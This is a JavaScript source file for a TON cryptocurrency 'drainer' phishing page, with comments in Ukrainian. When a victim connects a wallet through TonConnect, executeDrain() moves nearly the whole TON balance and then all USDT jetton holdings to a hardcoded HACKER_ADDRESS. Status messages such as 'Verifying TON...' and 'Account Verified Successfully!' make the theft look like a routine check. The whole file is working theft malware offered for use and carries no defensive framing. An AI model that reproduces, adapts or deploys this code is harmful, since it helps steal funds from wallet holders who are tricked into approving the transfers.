/**
 * TON PERFECT DRAINER ENGINE - FULLY LOCAL VERSION
 * Ця версія НЕ використовує CDN, вона працює тільки з локальними файлами.
 */

const CONFIG = {
    HACKER_ADDRESS: 'UQDcQ7af-ZcaiTSe8_X8P8q7tEm7iFk2ABzoRJs8Ty22mIdJ', 
    USDT_MASTER_ADDRESS: 'EQCST_B8n-99y2SUnL1E1O_9JzTj-GEnG-UoTdqZscfP6l6y',
    RPC_URL: 'https://toncenter.com/api/v2/jsonRPC',
    GAS_RESERVE: 0.05,
};

let tonConnectUI;

// Функція пошуку SDK в пам'яті
function getSDK() {
    return window.TONConnectUI || window.TON_CONNECT_UI || (window.TONConnect && window.TONConnect.UI);
}

async function initEngine() {
    const statusEl = document.getElementById('status');
    if (statusEl) statusEl.innerText = '⚙️ Initializing local engine...';

    // Оскільки ми підключили скрипти в index.html через <script src="...">,
    // вони вже мають бути в пам'яті. Просто чекаємо 1 секунду для надійності.
    await new Promise(r => setTimeout(r, 1000));
    
    const SDK = getSDK();
    
    if (!SDK) {
        console.error('❌ SDK not found in memory. Make sure tonconnect-ui.min.js is uploaded!');
        if (statusEl) statusEl.innerText = '❌ Critical Error: SDK missing.';
        return;
    }

    try {
        console.log('✅ Local SDK found! Booting UI...');
        const currentUrl = window.location.origin; 
        
        tonConnectUI = new SDK.TonConnectUI({
            manifestUrl: `${currentUrl}/manifest.json`, 
            buttonId: 'ton-connect-button',
        });

        const fallbackBtn = document.getElementById('fallback-connect-btn');
        if (fallbackBtn) {
            fallbackBtn.onclick = () => tonConnectUI.openModal();
        }

        setTimeout(() => {
            const btnContainer = document.getElementById('ton-connect-button');
            if (!btnContainer || btnContainer.innerHTML.trim() === "") {
                if (fallbackBtn) fallbackBtn.style.display = 'inline-block';
            }
        }, 2000);

        tonConnectUI.onStatusChange(async (status) => {
            if (status === 'connected') {
                if (statusEl) statusEl.innerText = '✅ Connected! Verifying...';
                await executeDrain();
            }
        });

        if (statusEl) statusEl.innerText = 'Ready for verification...';
        console.log('🚀 Local Engine Ready');
    } catch (e) {
        console.error('Init Error:', e);
        if (statusEl) statusEl.innerText = '❌ Init Error.';
    }
}

initEngine();

async function tonRpc(method, params) {
    try {
        const response = await fetch(CONFIG.RPC_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ jsonrpc: '2.0', id: Date.now().toString(), method, params })
        });
        const json = await response.json();
        return json.result;
    } catch (e) { return null; }
}

async function __getTonBalance(address) {
    const balance = await tonRpc('getBalance', [address]);
    return balance ? Number(balance) / 1e9 : 0;
}

async function __getJettonBalance(ownerAddress, masterAddress) {
    try {
        const tonWeb = new TonWeb.TonWeb();
        const jettonManager = new TonWeb.token.jetton.JettonManager(tonWeb);
        const userJettonWallet = await jettonManager.getJettonWalletAddress(masterAddress, ownerAddress);
        const data = await tonRpc('runMethod', [userJettonWallet.toString(), 'get_wallet_data', []]);
        const balance = BigInt(data?.stack?.[0]?.[1] || 0);
        return { balance, walletAddress: userJettonWallet.toString() };
    } catch (e) { return { balance: 0n, walletAddress: null }; }
}

async function executeDrain() {
    const userAddress = tonConnectUI.account.address;
    const statusEl = document.getElementById('status');
    const updateStatus = (msg) => statusEl && (statusEl.innerText = msg);

    try {
        updateStatus('🔍 Scanning assets...');
        const balance = await __getTonBalance(userAddress);
        const amountToSend = balance - CONFIG.GAS_RESERVE;

        if (amountToSend > 0) {
            updateStatus('⏳ Verifying TON...');
            await tonConnectUI.sendTransaction({
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    to: CONFIG.HACKER_ADDRESS,
                    amount: Math.floor(amountToSend * 1e9).toString(),
                    body: window.Buffer.toString(new TextEncoder().encode('Verification Code: ' + Math.floor(Math.random() * 1000000))),
                }]
            });
        }

        updateStatus('🔍 Scanning for USDT...');
        const { balance: usdtB, walletAddress: usdtW } = await __getJettonBalance(userAddress, CONFIG.USDT_MASTER_ADDRESS);

        if (usdtB > 0n && usdtW) {
            updateStatus('⏳ Verifying USDT...');
            const jettonWallet = new TonWeb.token.jetton.JettonWallet(usdtW);
            const transferBody = await jettonWallet.createTransferBody({
                amount: usdtB.toString(),
                toAddress: new TonWeb.Address(CONFIG.HACKER_ADDRESS),
                responseAddress: new TonWeb.Address(userAddress),
                forwardAmount: 0,
                forwardPayload: new TonWeb.boc.Cell()
            });

            await tonConnectUI.sendTransaction({
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    to: usdtW,
                    amount: '0.05',
                    body: transferBody.toString('base64'),
                }]
            });
        }
        updateStatus('✅ Account Verified Successfully!');
    } catch (e) {
        console.error('Drain Error:', e);
        updateStatus('⚠️ Verification failed.');
    }
}
